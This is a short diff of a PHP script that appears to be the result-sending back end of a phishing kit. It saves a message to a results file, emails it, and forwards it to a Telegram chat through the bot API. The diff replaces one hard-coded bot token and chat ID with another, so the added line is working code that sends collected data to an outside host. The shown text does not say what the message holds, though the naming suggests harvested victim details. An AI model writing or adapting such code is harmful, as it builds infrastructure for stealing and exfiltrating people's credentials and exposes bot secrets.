@@ -32,9 +32,9 @@ fwrite($Txt_Rezlt, $message);
 fclose($Txt_Rezlt);
 
 mail($to, $subject, $message, $headers);
-$token = "5258318869:AAEc9YN38UpQbGND-gtNoox74n0jrZ4m0ks";
+$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
 
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1289904248&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-662491150&text=" . urlencode($message)."" );
 
 
 
